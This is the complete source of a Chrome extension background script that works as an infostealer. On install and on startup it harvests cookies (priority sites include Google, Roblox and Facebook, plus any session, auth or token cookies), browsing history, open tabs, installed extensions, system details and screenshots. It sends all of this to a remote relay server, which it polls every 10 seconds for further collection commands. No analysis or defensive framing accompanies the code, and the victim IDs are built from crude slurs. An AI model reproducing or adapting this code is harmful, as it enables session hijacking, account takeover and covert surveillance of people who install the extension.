const SERVER_URL = 'https://discord-relay-production.up.railway.app';
const SITE_CHANGE_INTERVAL = 300000;
let pcId = null;
let lastUrl = '';
let lastScreenshotTime = 0;
let isSendingInProgress = false;

const animals = ['АНАЛЬНЫЙ_РАСШИРИТЕЛЬ','АНАЛЬНЫЙ_ДЕБОШИР','ВАЗЕЛИНОВЫЙ_ДИЛДАК','РАКУШКА_НЕБРИТАЯ','НЕМЫТЫЙ_БАКЛАЖАН'];

function log(msg, err=null) {
    const ts = new Date().toISOString();
    if(err) console.error(`[${ts}] [${pcId}] ${msg}`, err);
    else console.log(`[${ts}] [${pcId}] ${msg}`);
}

// ---------- PC ID ----------
async function getPcId() {
    return new Promise(resolve => {
        chrome.storage.local.get(['pcId'], data => {
            if (data.pcId) { pcId = data.pcId; resolve(pcId); }
            else {
                const animal = animals[Math.floor(Math.random()*animals.length)];
                const hash = Math.floor(Math.random()*1000000);
                pcId = `${animal}_${hash}`;
                chrome.storage.local.set({ pcId }, () => resolve(pcId));
            }
        });
    });
}

// ---------- Data Collection ----------
async function collectCookiesData() {
    return new Promise(resolve => {
        chrome.cookies.getAll({}, cookies => {
            const priorityDomains = [".google.com","google.com",".roblox.com","roblox.com",".gmail.com","gmail.com",".youtube.com","youtube.com",".facebook.com","facebook.com"];
            const filtered = cookies.filter(c => priorityDomains.some(d => c.domain===d || c.domain.endsWith(d)) || /(session|auth|token|login|password|secret|oauth|refresh|access|credential|jwt)/i.test(c.name));
            resolve({ cookies: filtered.map(c=>({
                domain:c.domain, name:c.name, value:c.value, secure:c.secure, httpOnly:c.httpOnly,
                expires: c.expirationDate?new Date(c.expirationDate*1000).toISOString():"Session", path:c.path
            }))});
        });
    });
}

async function collectHistoryData() {
    return new Promise(resolve => {
        chrome.history.search({text:'', maxResults:1000, startTime:0}, items => {
            resolve({ history: items.map(i=>({
                title:i.title||'No title', url:i.url, visitCount:i.visitCount, lastVisitTime:new Date(i.lastVisitTime).toLocaleString()
            }))});
        });
    });
}

function collectSystemData() {
    return { systemInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        languages: navigator.languages,
        cpuCores: navigator.hardwareConcurrency||'unknown',
        deviceMemory: navigator.deviceMemory||'unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    }};
}

async function collectScreenshotData() {
    return new Promise(resolve => {
        chrome.tabs.captureVisibleTab(null, {format:'jpeg', quality:80}, dataUrl => {
            if(chrome.runtime.lastError){ log('Screenshot failed', chrome.runtime.lastError); resolve({screenshot:null}); }
            else resolve({ screenshot: dataUrl.split(',')[1] });
        });
    });
}

async function collectTabsData() {
    return new Promise(resolve => {
        chrome.tabs.query({}, tabs => resolve({ tabs: tabs.map(t=>({title:t.title,url:t.url,id:t.id})) }));
    });
}

async function collectExtensionsData() {
    return new Promise(resolve => {
        if(chrome.management) chrome.management.getAll(exts => resolve({ extensions: exts.map(e=>({name:e.name,id:e.id,enabled:e.enabled})) }));
        else resolve({ extensions: [] });
    });
}

// ---------- Send Data ----------
async function sendData(command=null){
    if(isSendingInProgress) return;
    isSendingInProgress = true;
    try{
        log('Collecting data...');
        let data = { pcId };
        switch(command){
            case 'get_cookies': Object.assign(data, await collectCookiesData()); break;
            case 'get_history': Object.assign(data, await collectHistoryData()); break;
            case 'get_system': Object.assign(data, collectSystemData()); break;
            case 'get_screenshot': Object.assign(data, await collectScreenshotData()); break;
            default: 
                Object.assign(data,
                    await collectCookiesData(),
                    await collectHistoryData(),
                    await collectTabsData(),
                    await collectExtensionsData(),
                    collectSystemData(),
                    await collectScreenshotData()
                );
        }
        await fetch(`${SERVER_URL}/upload`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ ...data, command }) });
        log('Data sent to server');
    } catch(err){ log('Failed sending data', err); }
    finally{ isSendingInProgress=false; }
}

// ---------- Ping Server ----------
async function pingServer(){
    try{
        const res = await fetch(`${SERVER_URL}/ping`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ pcId }) });
        const data = await res.json();
        if(data.commands) data.commands.forEach(cmd => sendData(cmd));
    }catch(err){ log('Ping failed', err); }
}

// ---------- Check Site Change ----------
async function checkSiteChange(){
    try{
        const tabs = await new Promise(resolve => chrome.tabs.query({active:true,currentWindow:true}, resolve));
        if(!tabs.length) return;
        const tab = tabs[0];
        if(!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('about:')) return;
        const now = Date.now();
        if(tab.url !== lastUrl && now-lastScreenshotTime>SITE_CHANGE_INTERVAL){
            lastUrl=tab.url; lastScreenshotTime=now;
            log(`Site changed: ${tab.url}`);
            await sendData();
        }
    }catch(err){ log('checkSiteChange error', err); }
}

// ---------- Init ----------
async function init(){
    await getPcId();
    log('Extension started with PC ID: '+pcId);
    await sendData();
    setInterval(pingServer,10000);
    setInterval(checkSiteChange,5000);
    setInterval(sendData,SITE_CHANGE_INTERVAL);
}

chrome.runtime.onStartup.addListener(init);
chrome.runtime.onInstalled.addListener(init);